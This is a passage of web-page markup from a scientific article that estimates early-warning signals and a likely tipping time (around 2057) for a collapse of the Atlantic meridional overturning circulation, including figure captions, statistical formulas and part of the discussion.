line in (<b>a</b>). The red parabola is the quadratic potential corresponding to the approximating linear Ornstein‚ÄìUhlenbeck (OU) process (Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ3">3</a>)). The curve in gray is a realization of the OU process. The vertical short red bar shows the autocorrelation time, <i>t</i><sub><i>a</i><i>c</i></sub>, for the process. The long vertical red bar symbolizes the time window, <i>T</i><sub><i>w</i></sub> for calculating the early-warning signals (EWS). <b>d</b> As (<b>c</b>) for <i>Œª</i><sub>1</sub> close to <i>Œª</i><sub><i>c</i></sub> (purple dashed line in (<b>a</b>)). It can be seen directly that the gray realization has an increased autocorrelation and increased variance compared to the situation in (<b>c</b>).</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/3" data-track-dest="link:Figure3 Full size image" aria-label="Full size image figure 3" rel="nofollow"><span>Full size image</span></a></p></figure></div><div data-test="figure" data-container-section="figure" id="figure-4" data-title="Time scales."><figure><figcaption><b id="Fig4" data-test="figure-caption-text">Fig. 4: Time scales.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/4" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig4_HTML.png?as=webp"><img aria-describedby="Fig4" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig4_HTML.png" alt="figure 4" loading="lazy" width="685" height="488"></picture></a></div><p><b>a</b> Time scales involved in the critical transition ramping the control parameter <i>Œª</i> from <i>Œª</i><sub>0</sub>‚Äâ=‚Äâ‚àí2.7 to <i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ0, with a ramping time <i>œÑ</i><sub><i>r</i></sub>‚Äâ=‚Äâ133 years and <i>œÉ</i><sup>2</sup>‚Äâ=‚Äâ0.3. These parameters are obtained as best estimates from the Hadley Centre Sea Ice and Sea Surface Temperature data set (HadISST). The time remaining before <i>t</i><sub><i>c</i></sub> is shown on top of the plot. The red and orange curves show the time window, <i>T</i><sub><i>w</i></sub>, needed in order to detect the increase in variance (red) and autocorrelation (orange) above the pre-ramping values at the 95% confidence level. Close to the bifurcation point, the (quasi-)stationarity approximation becomes less valid, which is indicated by the dashed part of the two curves. It is seen that detecting a significant increase in autocorrelation requires a longer data window than detecting a significant increase in variance. With <i>T</i><sub><i>w</i></sub>‚Äâ=‚Äâ50 years (red dot-dashed line), an increase in variance can only be detected at the 95% confidence level after the red curve is below the 50-year level. The blue curve shows the mean waiting time for a noise-induced transition; when this becomes shorter than the 50-year level, the early-warning signal (EWS) is no longer relevant due to n-tipping occurring before <i>t</i><sub><i>c</i></sub>. Thus the range of time where an EWS can be applied is indicated by the green band (limited by the crossings of the red and blue curves with the size of the window). <b>b</b> Ten model realizations of the ramped approach to <i>t</i><sub><i>c</i></sub>, notice a few n-tippings prior to <i>t</i><sub><i>c</i></sub>. The black (black dashed) curve is the stable (unstable) fixed point of the model. <b>c</b> Increased variance as EWS: Black line is the pre-ramping steady state value, while the dashed lines are the two-standard error uncertainty range for calculating variance within the 50-year data window. The blue and dashed blue curves are the same but for the model approaching the transition. The brown curves correspond to the ten realizations in (<b>b</b>), while the green band corresponds to the green band in (<b>a</b>). The thin blue lines are the same obtained from simulating 1000 realizations. <b>d</b> Same as (<b>c</b>) but for the autocorrelation, where now the green band is narrower, corresponding to <i>T</i><sub><i>w</i><i>i</i><i>n</i></sub>(<i>a</i><i>c</i>) being smaller than the window size.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/4" data-track-dest="link:Figure4 Full size image" aria-label="Full size image figure 4" rel="nofollow"><span>Full size image</span></a></p></figure></div><h3 id="Sec5">Statistics of early-warning signals</h3><p>The variances of the estimators are approximately (see Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S1</a>).</p><div id="Equ4"><p><span>$${{{{{{{\rm{Var}}}}}}}}({\hat{\gamma }}^{2})\, \approx \, \frac{2{({\gamma }^{2})}^{2}}{\alpha {T}_{w}}=\frac{{\sigma }^{4}}{2{\alpha }^{3}{T}_{w}};\,{{{{{{{\rm{Var}}}}}}}}(\hat{\rho })\, \approx \, \frac{2\alpha {{\Delta }}{t}^{2}}{{T}_{w}},$$</span></p><p>
                    (4)
                </p></div><p>where <i>T</i><sub><i>w</i></sub>‚Äâ=‚Äâ<i>n</i>Œî<i>t</i> is the observation window.</p><p>The question is then how large <i>T</i><sub><i>w</i></sub> needs to be to detect a statistically significant increase compared to the estimated baseline values <span>\({\hat{\gamma }}_{0}^{2}\)</span> and <span>\({\hat{\rho }}_{0}\)</span>. For a given estimate <span>\({\hat{\gamma }}^{2}\)</span>, the estimated difference from the baseline variance is</p><div id="Equ5"><p><span>$${{{\Delta }}}_{{\gamma }^{2}}={\hat{\gamma }}^{2}-{\hat{\gamma }}_{0}^{2}={\hat{\gamma }}_{0}^{2}({\hat{\alpha }}_{0}/\hat{\alpha }-1),$$</span></p><p>
                    (5)
                </p></div><p>and the estimated difference from the baseline autocorrelation is</p><div id="Equ6"><p><span>$${{{\Delta }}}_{\rho }=\hat{\rho }-{\hat{\rho }}_{0}={\hat{\rho }}_{0}({e}^{({\hat{\alpha }}_{0}-\hat{\alpha }){{\Delta }}t}-1)\, \approx \, {\hat{\rho }}_{0}({\hat{\alpha }}_{0}-\hat{\alpha }){{\Delta }}t.$$</span></p><p>
                    (6)
                </p></div><p>Since the two EWSs, <span>\({\hat{\gamma }}^{2}\)</span> and <span>\(\hat{\rho }\)</span>, are treated on an equal footing, in the following, we let <span>\(\hat{\psi }\)</span> denote either of the estimators (given explicitly in Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S1</a>, Eqs. (<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S5)</a> or (<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S6)</a>). The standard error is <span>\(s(\hat{\psi })={{{{{{{\rm{Var}}}}}}}}{(\hat{\psi })}^{1/2}\)</span> (Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ4">4</a>)) and <span>\(\hat{{{\Delta }}}\)</span> denotes either of the two estimated differences (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ5">5</a>) or (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ6">6</a>). The null hypothesis is that <i>Œª</i>‚Äâ=‚Äâ<i>Œª</i><sub>0</sub>, or equivalently <i>Œ±</i>‚Äâ=‚Äâ<i>Œ±</i><sub>0</sub>. The null distribution of <span>\(\hat{\psi }\)</span> is assumed to be Gaussian (confirmed by simulations). A quantile <i>q</i> from the standard Gaussian distribution expresses the acceptable uncertainty in measuring the statistical quantity <i>œà</i>. We thus get that <span>\(\hat{{{\Delta }}} \, &lt; \, qs(\hat{\psi })\)</span> at the <i>q</i>-confidence level (95%, 99% or similar) under the null hypothesis. To detect an EWS at the <i>q</i>-confidence level based on measuring <i>œà</i> at time <i>t</i>, we require that <span>\(\hat{{{\Delta }}}(t) \, &gt; \, q(s(\hat{\psi }(t))+s({\hat{\psi }}_{0}))\)</span>, which, solved for <i>T</i><sub><i>w</i></sub> gives for variance:</p><div id="Equ7"><p><span>$${T}_{w} &gt; 2{q}^{2}{\left(\frac{\hat{\alpha }(t)/\sqrt{{\hat{\alpha }}_{0}}+{\hat{\alpha }}_{0}/\sqrt{\hat{\alpha }(t)}}{{\hat{\alpha }}_{0}-\hat{\alpha }(t)}\right)}^{2},$$</span></p><p>
                    (7)
                </p></div><p>and for autocorrelation,</p><div id="Equ8"><p><span>$${T}_{w} &gt; 2{q}^{2}{\left(\frac{\sqrt{{\hat{\alpha }}_{0}}+\sqrt{\hat{\alpha }(t)}}{{\hat{\alpha }}_{0}-\hat{\alpha }(t)}\right)}^{2}{\hat{\rho }}_{0}^{-2}.$$</span></p><p>
                    (8)
                </p></div><p>Substituting <span>\({\alpha }_{0}=2\sqrt{A|{\lambda }_{0}|}\)</span> and <span>\(\alpha (t)=2\sqrt{A|\lambda (t)|}\)</span> provides the time window <i>T</i><sub><i>w</i></sub> needed to detect an EWS at time <i>t</i> with large probability. Eqs. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ7">7</a>) and (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ8">8</a>) are illustrated in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>a (red and yellow curves), where it is seen that detecting a significant increase in variance requires a shorter data window than detecting a significant increase in autocorrelation. Two times <span>\(s(\hat{\psi }(t))\)</span> around the mean of the ramped variance and two times <span>\(s({\hat{\psi }}_{0})\)</span> around baseline values are illustrated in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>c, d (dashed lines). Once a trace leaves the baseline confidence interval, a statistically significant change is detected, and when the two dashed lines cross, 95% of the traces have detected an EWS (Eqs. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ7">7</a>) and (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ8">8</a>)).</p><h3 id="Sec6">Predicting a forthcoming collapse of the AMOC</h3><p>The AMOC fingerprint shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>e (replotted in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>a) shows an increased variance, <i>Œ≥</i><sup>2</sup>, and autocorrelation, <i>œÅ</i>, plotted in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>b, c as functions of the mid-point of a 50-year running window, i.e., the EWS obtained in 2020 is assigned to the year 1995. The estimates leave the confidence band of the baseline values (pink area) around the year 1970. This is not the estimate of <i>t</i><sub>0</sub>, which happened earlier and is still to be estimated; it is the year where EWSs are statistically different from baseline values. The estimates after 1970 stay consistently above the upper limit of the confidence interval and show an increasing trend, and we thus conclude that the system is moving toward the tipping point with high probability.</p><div data-test="figure" data-container-section="figure" id="figure-5" data-title="Detection of early-warning signals and prediction of tipping time."><figure><figcaption><b id="Fig5" data-test="figure-caption-text">Fig. 5: Detection of early-warning signals and prediction of tipping time.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/5" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig5_HTML.png?as=webp"><img aria-describedby="Fig5" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig5_HTML.png" alt="figure 5" loading="lazy" width="685" height="1092"></picture></a></div><p><b>a</b> Sea surface temperature (SST) anomaly (identical to Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig1">1</a>e) together with the best estimate model of the steady state approaching a critical transition. <b>b</b>, <b>c</b> Variance and autocorrelation calculated within running 50-year windows, similar to Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig4">4</a>c, d. The two-standard error level (indicated by the purple band) is obtained using the model to estimate the time varying <i>Œ±</i> (<b>d</b>) and <i>œÉ</i><sup>2</sup> (<b>e</b>) from the data. <b>f</b> Best estimate for <i>t</i><sub><i>c</i></sub>. The yellow histogram is the probability density for <i>t</i><sub><i>c</i></sub> obtained by maximum likelihood estimates (see Supplementary Information&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S1</a> and <a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S2)</a>.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/5" data-track-dest="link:Figure5 Full size image" aria-label="Full size image figure 5" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>To estimate the tipping time once it has been established that the variance and autocorrelation are increasing, we use two independent methods to check the robustness of our results: (1) Moment-based estimator that uses the variance and autocorrelation estimates within the running windows. (2) Approximate MLE directly on model (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>)-(<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>) with no running window. The advantage of the first method is that it has less model assumptions; however, it is sensitive to the choice of window size. The advantage of the second method is that it uses the information in the data more efficiently given model (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>)-(<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>) is approximately correct, it has no need for a running window and does not assume stationarity after time <i>t</i><sub>0</sub>. In general, MLE is statistically the preferred method of choice, giving the most accurate results with the lowest estimation variance.</p><p>The first method, the moment estimator of the tipping time obtains, within the running window, the parameters <i>Œ±</i>(<i>t</i>) (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>d) and <i>œÉ</i><sup>2</sup> (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>e) of the linearized dynamics, Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ3">3</a>), and thus also <i>Œ≥</i><sup>2</sup>(<i>t</i>). Within the running window, the data are detrended before estimation by subtracting a linear regression fit in order not to falsely inflate the variance estimates caused by deviations from stationarity. Then we obtain <i>A</i><i>Œª</i>(<i>t</i>) from <i>œÉ</i><sup>2</sup> and <i>Œ≥</i><sup>2</sup>(<i>t</i>) (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>f) using that <span>\(A\lambda (t)={({\sigma }^{2}/4{\gamma }^{2}(t))}^{2}\)</span>. This is consistent with a linear ramping of <i>Œª</i>(<i>t</i>) beginning from a constant level <i>Œª</i><sub>0</sub> at a time <i>t</i><sub>0</sub>. By sweeping <i>t</i><sub>0</sub> from 1910 to 1950 and <i>T</i><sub><i>w</i></sub> from 45 to 65 years, we obtain <i>A</i><i>Œª</i><sub>0</sub> and <i>œÑ</i><sub><i>r</i></sub> from the least square error fit to the data. This shows a single minimum at <i>t</i><sub>0</sub>‚Äâ=‚Äâ1924 and <i>T</i><sub><i>w</i></sub>‚Äâ=‚Äâ55 years (Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig6">6</a>e). Setting <i>t</i><sub>0</sub>‚Äâ=‚Äâ1924, we obtain <i>t</i><sub><i>c</i></sub> from a linear fit (regressing <i>Œª</i> on <i>t</i>) from the crossing of the <i>x</i>-axis (<i>Œª</i><sub><i>c</i></sub>‚Äâ=‚Äâ0). This is shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>f (red line). This yields ‚àí<i>A</i><i>Œª</i><sub>0</sub>‚Äâ=‚Äâ2.34 year<sup>‚àí2</sup> and <i>œÑ</i><sub><i>r</i></sub>‚Äâ=‚Äâ133 years. Thus, the tipping time is estimated to be in the year 2057, shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>f. Since we have only obtained the combined quantity <span>\(A\lambda={({\sigma }^{2}/4{\gamma }^{2})}^{2}\)</span>, we still need to determine <i>A</i> and <i>m</i> in Eq. (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>). We do that from the best linear fit to the mean level <span>\(\mu=m+\sqrt{|\lambda|/A}\)</span> observing that <span>\(\mu=m+\sqrt{A|\lambda|}(1/A)=m+({\sigma }^{2}/4{\gamma }^{2})(1/A)\)</span>. The estimates are shown by the red curves in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>a‚Äìf. The red dot in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>a is the tipping point, and the dashed line in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>b is the asymptote for the variance. With the parameter values completely determined, the confidence levels are calculated: The two-standard error levels around the baseline values of the EWS are shown by purple bands in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>b, c. Thus, both EWSs show increases beyond the two-standard error level from 1970 and onward.</p><div data-test="figure" data-container-section="figure" id="figure-6" data-title="Bootstrap confidence intervals, optimal estimation window and model control."><figure><figcaption><b id="Fig6" data-test="figure-caption-text">Fig. 6: Bootstrap confidence intervals, optimal estimation window and model control.</b></figcaption><div><div><a data-test="img-link" data-track="click" data-track-label="image" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/6" rel="nofollow"><picture><source type="image/webp" srcset="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig6_HTML.png?as=webp"><img aria-describedby="Fig6" src="https://media.springernature.com/lw685/springer-static/image/art%3A10.1038%2Fs41467-023-39810-w/MediaObjects/41467_2023_39810_Fig6_HTML.png" alt="figure 6" loading="lazy" width="685" height="455"></picture></a></div><p>With parameters obtained from the data, a set of 1000 realizations of the model are used in a bootstrap study to assess the uncertainty of parameters. <b>a</b>‚Äì<b>d</b> Probability densities for <i>t</i><sub><i>c</i></sub>, <i>Œª</i><sub>0</sub>, <i>m</i> and ‚àí<i>A</i>‚Äâ√ó‚Äâ<i>m</i>. Red crosses are the values obtained from the Atlantic meridional overturning circulation (AMOC) fingerprint data. The 95% confidence intervals are indicated by orange lines. The critical time <i>t</i><sub><i>c</i></sub> is 2057, and the 95% confidence interval is 2025‚Äì2095. <b>e</b> Mean square error in fitting the ramping as a function of window size <i>T</i><sub><i>w</i></sub> and time of initiating ramping, <i>t</i><sub>0</sub>. A unique minimum is found for <i>T</i><sub><i>w</i></sub>‚Äâ=‚Äâ55 years and <i>t</i><sub>0</sub>‚Äâ=‚Äâ1924. <b>f</b> Quantile-quantile-plot of residuals from the model, if points fall close to a straight line (black line), the model fits the data well.</p></div><p><a data-test="article-link" data-track="click" data-track-label="button" data-track-action="view figure" href="https://www.nature.com/articles/s41467-023-39810-w/figures/6" data-track-dest="link:Figure6 Full size image" aria-label="Full size image figure 6" rel="nofollow"><span>Full size image</span></a></p></figure></div><p>The second method, the approximate MLE of the tipping time, is applied to model (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>)‚Äì(<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ2">2</a>). The likelihood function is the product of transition densities between consecutive observations. However, the likelihood is not explicitly known for this model, and we therefore approximate the transition densities. From the data before time <i>t</i><sub>0</sub>, approximation (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ3">3</a>) is used, where exact MLEs are available (Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S1)</a>. This provides estimates of the parameters <i>Œª</i><sub>0</sub>,‚Äâ<i>m</i> as a function of parameter <i>A</i>, as well as the variance parameter <i>œÉ</i><sup>2</sup>. To estimate <i>A</i> and <i>œÑ</i><sub><i>r</i></sub>, the observations after time <i>t</i><sub>0</sub> are used. After time <i>t</i><sub>0</sub>, the linear approximation (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ3">3</a>) is no longer valid because the dynamics are approaching the bifurcation point, and the non-linear dynamics will be increasingly dominating. The likelihood function is the product of transition densities, which we approximate with a numerical scheme, the Strang splitting, which has shown to have desirable statistical properties for highly non-linear models, where other schemes, such as the Euler‚ÄìMaruyama approximation is too inaccurate<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 32" title="Pilipovic, P., Samson, A. &amp; Ditlevsen, S. Parameter estimation in nonlinear multivariate stochastic differential equations based on splitting schemes. Preprint at 
                  https://arxiv.org/abs/2211.11884
                  
                 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR32" id="ref-link-section-d21713702e5353">32</a></sup> (Supplementary text&nbsp;<a data-track="click" data-track-label="link" data-track-action="supplementary material anchor" href="https://www.nature.com/articles/s41467-023-39810-w#MOESM1">S2)</a>. Using <i>t</i><sub>0</sub>‚Äâ=‚Äâ1924, the optimal fit is the same as the moment method, <i>t</i><sub><i>c</i></sub>‚Äâ=‚Äâ2057, with a 95% confidence interval 2025‚Äì2095.</p><p>Confidence intervals for the estimate of the tipping time are obtained by bootstrap. The likelihood approach provides asymptotic confidence intervals; however, these assume that the likelihood is the true likelihood. To incorporate also the uncertainty due to the data generating mechanism (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>) not being equal to the Ornstein‚ÄìUhlenbeck process (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ3">3</a>) used in the likelihood, we chose to construct parametric bootstrap confidence intervals. This was obtained by simulating 1000 trajectories from the original model with the estimated parameters and repeating the estimation procedure on each data set. Empirical confidence intervals were then extracted from the 1000 parameter estimates. These were indeed larger than the asymptotic confidence intervals provided by the likelihood approach, however, not by much. Histograms of the bootstrapped estimates are shown in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig6">6</a>a‚Äìd. The histogram in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig6">6</a>a is the tipping year, repeated in yellow in&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig5">5</a>f.</p><p>The mean of the bootstrapped estimates of the tipping time is „Äà<i>t</i><sub><i>c</i></sub>„Äâ‚Äâ=‚Äâ2050, and the 95% confidence interval is 2025‚Äì2095. The small discrepancy in the mean is probably due to the approximate model used for estimation being different from the data-generating model (<a data-track="click" data-track-label="link" data-track-action="equation anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Equ1">1</a>), confirming that the linear model still provides valid estimates even if the true dynamics are unknown. To test the goodness-of-fit, normal residuals (see ‚ÄúMethods‚Äù) were calculated for the data. These are plotted in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig6">6</a>f as a quantile-quantile plot. If the model is correct, the points fall close to a straight line. The model is seen to fit the data well, further supporting the obtained estimates.</p></div></div><div id="Sec7-section" data-title="Discussion"><h2 id="Sec7">Discussion</h2><div id="Sec7-content"><p>We have provided a robust statistical analysis to quantify the uncertainty in observed EWSs for a forthcoming critical transition. The confidence depends on how rapidly the system is approaching the tipping point. With this, the significance of the observed EWSs for the AMOC has been established. This is a stronger result than just observing a significant trend in the EWS by, say, Kendall‚Äôs <i>œÑ</i> test<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 27" title="Boers, N. Observation-based early-warning signals for a collapse of the Atlantic meridional overturning circulation. Nat. Clim. Change 11, 680‚Äì688 (2021)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR27" id="ref-link-section-d21713702e5416">27</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 33" title="Michel, S. L. L. et al. Early warning signal for a tipping point suggested by a millennial Atlantic multidecadal variability reconstruction. Nat. Commun. 13, 5176 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR33" id="ref-link-section-d21713702e5419">33</a></sup>. Here we calculate when the EWS are significantly above the natural variations. Furthermore, we have provided a method to not only determine whether a critical transition will happen but also an estimate of when it will happen. We predict with high confidence the tipping to happen as soon as mid-century (2025‚Äì2095 is a 95% confidence range). These results are under the assumption that the model is approximately correct, and we, of course, cannot rule out that other mechanisms are at play, and thus, the uncertainty is larger. However, we have reduced the analysis to have as few and sound assumptions as possible, and given the importance of the AMOC for the climate system, we ought not to ignore such clear indicators of an imminent collapse.</p><p>The hysteresis simulations gathered in the model intercomparison<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 34" title="Rahmstorf, S. et al. Thermohaline circulation hysteresis: a model intercomparison. Geophys. Res. Lett. 32, L23605 (2005)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR34" id="ref-link-section-d21713702e5426">34</a></sup> are equilibrium runs, for which a prediction of a future collapse does obviously not apply. Likewise, for the simulations specified in the CMIP6 experiment. It could though be relevant to evaluate our method on state-of-the-art climate model simulations with linearly ramped external forcing and different ramping speeds in order to obtain the model-specific confidence in early prediction of the collapse judged solely from the EWSs.</p><p>Though we have established firm statistical methods to evaluate the confidence in the observed EWS, we can at present not rule out the possibility that a collapse will only be partial and not lead to a full collapse of the AMOC as suggested by some models: Note in Fig.&nbsp;<a data-track="click" data-track-label="link" data-track-action="figure anchor" href="https://www.nature.com/articles/s41467-023-39810-w#Fig2">2</a>, the ‚ÄúMPM‚Äù in the top panel and the ‚ÄúMOM hor‚Äù in the bottom panel both seem to show only partial tipping prior to the tipping to the complete shutdown of the AMOC. This result is also found in a more recent ocean model<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 35" title="Lohmann, J., Dijkstra, H. A., Jochum, M., Lucarini, V. &amp; Ditlevsen, P. D. Multistability and intermediate tipping of the Atlantic Ocean circulation. Preprint at 
                  https://arxiv.org/abs/2304.05664
                  
                 (2023)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR35" id="ref-link-section-d21713702e5436">35</a></sup>. Furthermore, a high speed of ramping, i.e., a high speed at which the critical value of the control parameter is approached, could also increase the probability of tipping<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 36" title="Lohmann, J. &amp; Ditlevsen, P. Risk of tipping the overturning circulation due to increasing rates of ice melt. Proc. Natl Acad. Sci. USA 118, e2017989118 (2021)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR36" id="ref-link-section-d21713702e5440">36</a></sup>. This scenario is the case of rate-induced tipping<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 37" title="Ashwin, P., Wieczorek, S., Vitolo, R. &amp; Cox, P. Tipping points in open systems: bifurcation, noise-induced and rate-dependent examples in the climate system. Philos. Trans. R. Soc. A Math. Phys. Eng. Sci. 370, 1166‚Äì1184 (2012)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR37" id="ref-link-section-d21713702e5444">37</a></sup>. Even with these reservations, this is indeed a worrisome result, which should call for fast and effective measures to reduce global greenhouse gas emissions in order to avoid the steady change of the control parameter toward the collapse of the AMOC (i.e., reduce temperature increase and freshwater input through ice melting into the North Atlantic region). As a collapse of the AMOC has strong societal implications<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 38" title="Kemp, L. et al. Climate endgame: exploring catastrophic climate change scenarios. Proc. Natl Acad. Sci. USA 119, e2108146119 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR38" id="ref-link-section-d21713702e5448">38</a></sup>, it is important to monitor the flow and EWS from direct measurements<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Baehr, J. et al. Timely detection of changes in the meridional overturning circulation at 26¬∞N in the Atlantic. J. Clim. 20, 5827‚Äì5841 (2007)." href="#ref-CR39" id="ref-link-section-d21713702e5453">39</a>,<a data-track="click" data-track-action="reference anchor" 